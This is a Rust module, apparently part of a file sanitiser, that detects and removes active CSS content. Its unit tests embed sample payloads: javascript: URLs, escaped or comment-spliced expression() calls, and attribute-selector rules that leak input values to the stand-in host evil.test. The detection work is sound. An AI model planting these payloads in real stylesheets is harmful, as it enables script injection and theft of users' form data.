//! CSS is presentation until it runs a function or makes a request, and a
//! stylesheet can do both. The tokenizer resolves escapes and drops comments,
//! so `\65 xpression(` and `url(\6a\61 vascript:…)` are seen for what they are.
//!
//! Findings carry the byte range of the rule that holds them, which is what the
//! `Allow` path deletes.

use std::ops::Range;

use cssparser::{Parser, ParserInput, Token};

use crate::report::SanitisationAction;

use super::located_action;

const SCRIPTING: &[&str] = &["expression", "-moz-binding", "behavior"];
const GROUPING: &[&str] = &[
    "media",
    "supports",
    "document",
    "layer",
    "container",
    "scope",
];
const ACTIVE_DATA_TYPES: &[&str] = &[
    "text/html",
    "application/xhtml+xml",
    "image/svg+xml",
    "text/javascript",
    "application/javascript",
    "application/ecmascript",
];

pub fn css_has_active_content(data: &[u8]) -> Vec<SanitisationAction> {
    let source = String::from_utf8_lossy(data);
    let bytes = source.as_bytes();
    findings(&source)
        .into_iter()
        .map(|f| located_action(f.rule_id, f.line, f.offset, bytes))
        .collect()
}

pub fn sanitize_css(data: &[u8]) -> Vec<u8> {
    let source = String::from_utf8_lossy(data);
    let bytes = source.as_bytes();

    let mut spans: Vec<Range<usize>> = findings(&source).into_iter().map(|f| f.span).collect();
    spans.sort_by_key(|span| span.start);

    let mut out = Vec::with_capacity(bytes.len());
    let mut cursor = 0;
    for span in spans {
        let start = span.start.min(bytes.len());
        let end = span.end.min(bytes.len());
        if start < cursor {
            // an enclosing rule already took this one with it
            cursor = cursor.max(end);
            continue;
        }
        out.extend_from_slice(&bytes[cursor..start]);
        cursor = end;
    }
    out.extend_from_slice(&bytes[cursor.min(bytes.len())..]);
    out
}

struct Finding {
    rule_id: &'static str,
    /// One-based, for a human reading the report.
    line: u64,
    offset: usize,
    /// The rule that has to go for the finding to go.
    span: Range<usize>,
}

/// What one rule turned out to contain.
#[derive(Default)]
struct Facts {
    at_keyword: Option<String>,
    /// The prelude selects on a fragment of an attribute value.
    discriminates: bool,
    /// The rule would make the browser fetch something.
    fetches: bool,
    hits: Vec<(&'static str, u64, usize)>,
}

fn findings(source: &str) -> Vec<Finding> {
    let mut input = ParserInput::new(source);
    let mut parser = Parser::new(&mut input);
    let mut out = Vec::new();
    scan_rules(&mut parser, &mut out);
    if let Some(extra) = parser_disagreement(source, &out) {
        out.push(extra);
    }
    out
}

fn scan_rules(parser: &mut Parser, out: &mut Vec<Finding>) {
    while !parser.is_exhausted() {
        parser.skip_whitespace();
        let start = parser.position().byte_index();
        let line = line_of(parser);
        let mut facts = Facts::default();

        if scan_prelude(parser, &mut facts) {
            let grouping = facts
                .at_keyword
                .as_deref()
                .is_some_and(|name| GROUPING.iter().any(|g| name.eq_ignore_ascii_case(g)));
            let _ = parser.parse_nested_block::<_, (), ()>(|inner| {
                match grouping {
                    true => scan_rules(inner, out),
                    false => scan_values(inner, &mut facts),
                }
                Ok(())
            });
        }

        let end = parser.position().byte_index();
        emit(facts, line, start..end, out);

        // a rule that consumed nothing would spin the loop forever
        if end == start {
            break;
        }
    }
}

fn scan_prelude(parser: &mut Parser, facts: &mut Facts) -> bool {
    loop {
        parser.skip_whitespace();
        let line = line_of(parser);
        let offset = parser.position().byte_index();
        let token = match parser.next() {
            Ok(token) => token.clone(),
            Err(_) => return false,
        };
        match token {
            Token::CurlyBracketBlock => return true,
            Token::Semicolon => return false,
            other => visit(parser, &other, line, offset, facts),
        }
    }
}

fn scan_values(parser: &mut Parser, facts: &mut Facts) {
    loop {
        parser.skip_whitespace();
        let line = line_of(parser);
        let offset = parser.position().byte_index();
        let token = match parser.next() {
            Ok(token) => token.clone(),
            Err(_) => return,
        };
        visit(parser, &token, line, offset, facts);
    }
}

fn visit(parser: &mut Parser, token: &Token, line: u64, offset: usize, facts: &mut Facts) {
    match token {
        Token::AtKeyword(name) => {
            if name.eq_ignore_ascii_case("import") {
                facts.hits.push(("scan.css.import", line, offset));
            }
            facts.at_keyword = Some(name.to_string());
        }
        Token::Ident(name) => {
            if is_scripting(name) {
                facts.hits.push(("scan.css.expression", line, offset));
            }
        }
        Token::Function(name) => {
            if name.eq_ignore_ascii_case("url") {
                facts.fetches = true;
            }
            if is_scripting(name) {
                facts.hits.push(("scan.css.expression", line, offset));
            }
            descend(parser, facts);
        }
        Token::UnquotedUrl(value) => {
            facts.fetches = true;
            if is_dangerous(value) {
                facts.hits.push(("scan.css.dangerous_scheme", line, offset));
            }
        }
        Token::BadUrl(value) | Token::BadString(value) => {
            if is_dangerous(&url_contents(value)) {
                facts.hits.push(("scan.css.dangerous_scheme", line, offset));
            }
        }
        Token::QuotedString(value) => {
            if is_dangerous(value) {
                facts.hits.push(("scan.css.dangerous_scheme", line, offset));
            }
        }
        Token::PrefixMatch | Token::SuffixMatch | Token::SubstringMatch => {
            facts.discriminates = true;
        }
        Token::ParenthesisBlock | Token::SquareBracketBlock | Token::CurlyBracketBlock => {
            descend(parser, facts);
        }
        _ => {}
    }
}

fn descend(parser: &mut Parser, facts: &mut Facts) {
    let _ = parser.parse_nested_block::<_, (), ()>(|inner| {
        scan_values(inner, facts);
        Ok(())
    });
}

fn emit(facts: Facts, line: u64, span: Range<usize>, out: &mut Vec<Finding>) {
    if facts.discriminates && facts.fetches {
        out.push(Finding {
            rule_id: "scan.css.exfiltration",
            line,
            offset: span.start,
            span: span.clone(),
        });
    }
    for (rule_id, line, offset) in facts.hits {
        out.push(Finding {
            rule_id,
            line,
            offset,
            span: span.clone(),
        });
    }
}

/// What a malformed url token was trying to say, without the `url(` wrapper or
/// the quotes the tokenizer could not close.
fn url_contents(raw: &str) -> String {
    let trimmed = raw.trim();
    let inner = trimmed
        .strip_prefix("url(")
        .or_else(|| trimmed.strip_prefix("URL("))
        .unwrap_or(trimmed);
    inner
        .trim_start_matches(['"', '\'', ' '])
        .trim_end_matches([')', '"', '\''])
        .to_string()
}

fn is_scripting(name: &str) -> bool {
    SCRIPTING.iter().any(|s| name.eq_ignore_ascii_case(s))
}

fn is_dangerous(value: &str) -> bool {
    let stripped: String = value
        .chars()
        .filter(|c| !c.is_whitespace() && !c.is_control())
        .collect();
    let lower = stripped.to_ascii_lowercase();
    if lower.starts_with("javascript:") {
        return true;
    }
    match lower.strip_prefix("data:") {
        Some(rest) => ACTIVE_DATA_TYPES.iter().any(|t| rest.starts_with(t)),
        None => false,
    }
}

fn line_of(parser: &Parser) -> u64 {
    parser.current_source_location().line as u64 + 1
}

fn parser_disagreement(source: &str, tokenized: &[Finding]) -> Option<Finding> {
    if tokenized.iter().any(|f| f.rule_id == "scan.css.expression") {
        return None;
    }
    let spliced = strip_comments(source).to_ascii_lowercase();
    SCRIPTING
        .iter()
        .any(|name| spliced.contains(name))
        .then(|| Finding {
            rule_id: "scan.css.expression",
            line: 1,
            offset: 0,
            span: 0..source.len(),
        })
}

fn strip_comments(source: &str) -> String {
    let mut out = String::with_capacity(source.len());
    let mut rest = source;
    while let Some(open) = rest.find("/*") {
        out.push_str(&rest[..open]);
        rest = match rest[open + 2..].find("*/") {
            Some(close) => &rest[open + 2 + close + 2..],
            None => "",
        };
    }
    out.push_str(rest);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ids(css: &str) -> Vec<&'static str> {
        findings(css).into_iter().map(|f| f.rule_id).collect()
    }

    #[test]
    fn a_plain_stylesheet_has_no_active_content() {
        assert!(ids("body { color: red; margin: 0 }").is_empty());
    }

    #[test]
    fn an_ordinary_background_image_is_not_a_finding() {
        assert!(ids("body { background: url('/bg.png') }").is_empty());
    }

    #[test]
    fn an_inline_image_is_not_a_dangerous_scheme() {
        // data: carries fonts and images every day; only markup and script types run
        assert!(ids("body { background: url('data:image/png;base64,AAAA') }").is_empty());
    }

    #[test]
    fn a_javascript_url_is_a_dangerous_scheme() {
        assert_eq!(
            ids(r#"body { background-image: url("javascript:alert(1)") }"#),
            ["scan.css.dangerous_scheme"]
        );
    }

    #[test]
    fn an_unquoted_javascript_url_is_a_dangerous_scheme() {
        assert_eq!(
            ids("body { background-image: url(javascript:alert(1)) }"),
            ["scan.css.dangerous_scheme"]
        );
    }

    #[test]
    fn an_escaped_javascript_url_is_still_dangerous() {
        // the tokenizer resolves `\6a\61` before we ever see the value
        assert_eq!(
            ids(r"body { background: url('\6a\61 vascript:alert(1)') }"),
            ["scan.css.dangerous_scheme"]
        );
    }

    #[test]
    fn an_active_data_uri_is_dangerous() {
        assert_eq!(
            ids(r#"body { background: url("data:text/html,<script>") }"#),
            ["scan.css.dangerous_scheme"]
        );
    }

    #[test]
    fn expression_is_detected() {
        assert_eq!(
            ids("body { width: expression(document.cookie) }"),
            ["scan.css.expression"]
        );
    }

    #[test]
    fn expression_is_detected_regardless_of_case() {
        assert_eq!(
            ids("body { width: EXPRESSION(1) }"),
            ["scan.css.expression"]
        );
    }

    #[test]
    fn an_escaped_expression_is_detected() {
        assert_eq!(
            ids(r"body { width: \65 xpression(1) }"),
            ["scan.css.expression"]
        );
    }

    #[test]
    fn a_comment_spliced_expression_is_detected() {
        // two identifiers to a spec parser, one function to the engine that runs it
        assert_eq!(
            ids("body { width: expr/**/ession(1) }"),
            ["scan.css.expression"]
        );
    }

    #[test]
    fn binding_properties_are_active() {
        assert_eq!(
            ids("body { -moz-binding: url('/x.xml#y') }"),
            ["scan.css.expression"]
        );
        assert_eq!(
            ids("body { behavior: url('/x.htc') }"),
            ["scan.css.expression"]
        );
    }

    #[test]
    fn both_import_forms_are_reported() {
        assert_eq!(
            ids(r#"@import url("http://other.test/a.css");"#),
            ["scan.css.import"]
        );
        assert_eq!(ids(r#"@import "a.css";"#), ["scan.css.import"]);
    }

    #[test]
    fn an_import_of_a_script_url_is_both_findings() {
        let found = ids(r#"@import "javascript:alert(1)";"#);
        assert!(found.contains(&"scan.css.import"));
        assert!(found.contains(&"scan.css.dangerous_scheme"));
    }

    #[test]
    fn a_prefix_selector_with_a_fetch_is_exfiltration() {
        assert_eq!(
            ids("input[value^='a'] { background: url('http://evil.test/?v=a') }"),
            ["scan.css.exfiltration"]
        );
    }

    #[test]
    fn suffix_and_substring_selectors_count_too() {
        assert_eq!(
            ids("a[href$='.pdf'] { background: url('http://evil.test/') }"),
            ["scan.css.exfiltration"]
        );
        assert_eq!(
            ids("a[href*='secret'] { background: url('http://evil.test/') }"),
            ["scan.css.exfiltration"]
        );
    }

    #[test]
    fn a_fragment_selector_without_a_fetch_is_not_exfiltration() {
        assert!(ids("input[value^='a'] { color: red }").is_empty());
    }

    #[test]
    fn an_exact_attribute_selector_is_not_exfiltration() {
        // `=` reads the whole value, so it leaks nothing letter by letter
        assert!(ids("input[type='text'] { background: url('/bg.png') }").is_empty());
    }

    #[test]
    fn a_finding_inside_a_media_block_is_found() {
        assert_eq!(
            ids("@media screen { body { width: expression(1) } }"),
            ["scan.css.expression"]
        );
    }

    #[test]
    fn an_empty_stylesheet_is_clean() {
        assert!(ids("").is_empty());
        assert!(ids("   \n\t ").is_empty());
    }

    #[test]
    fn malformed_input_does_not_panic() {
        for css in [
            "body { /* never closed",
            "body {",
            "}",
            "@import",
            "url(",
            r"body { content: '\'",
            "a[",
            "@media {",
        ] {
            let _ = ids(css);
        }
    }

    #[test]
    fn a_finding_names_its_line_and_offset() {
        let css = "body {\n  color: red;\n  width: expression(1);\n}";
        let found = findings(css);
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].line, 3);
        assert_eq!(&css[found[0].offset..found[0].offset + 10], "expression");
    }

    #[test]
    fn the_rewrite_drops_the_rule_that_holds_the_finding() {
        let css = "body { width: expression(1) }\np { color: red }\n";
        let out = String::from_utf8(sanitize_css(css.as_bytes())).unwrap();
        assert!(!out.contains("expression"));
        assert!(out.contains("p { color: red }"));
    }

    #[test]
    fn the_rewrite_keeps_a_clean_stylesheet_byte_identical() {
        let css = "body { color: red }\np { margin: 0 }\n";
        assert_eq!(sanitize_css(css.as_bytes()), css.as_bytes());
    }

    #[test]
    fn the_rewrite_drops_every_offending_rule() {
        let css = r#"body { background: url("javascript:alert(1)") }
@import "http://evil.test/x.css";
input[value^='a'] { background: url('http://evil.test/?v=a') }
p { color: red }"#;
        let out = String::from_utf8(sanitize_css(css.as_bytes())).unwrap();
        assert!(!out.contains("javascript:"));
        assert!(!out.contains("@import"));
        assert!(!out.contains("evil.test"));
        assert!(out.contains("p { color: red }"));
    }

    #[test]
    fn overlapping_findings_do_not_duplicate_output() {
        // two findings in one rule share a span, so the rule is removed once
        let css = "body { width: expression(1); height: expression(2) }\np { color: red }";
        let out = String::from_utf8(sanitize_css(css.as_bytes())).unwrap();
        assert_eq!(out.matches("p { color: red }").count(), 1);
        assert!(!out.contains("expression"));
    }

    #[test]
    fn the_actions_carry_the_active_content_category() {
        let actions = css_has_active_content(b"body { width: expression(1) }");
        assert_eq!(actions.len(), 1);
        assert_eq!(actions[0].rule_id, "scan.css.expression");
        assert_eq!(actions[0].category, "active_content");
        assert!(actions[0].location.byte_offset > 0);
    }
}
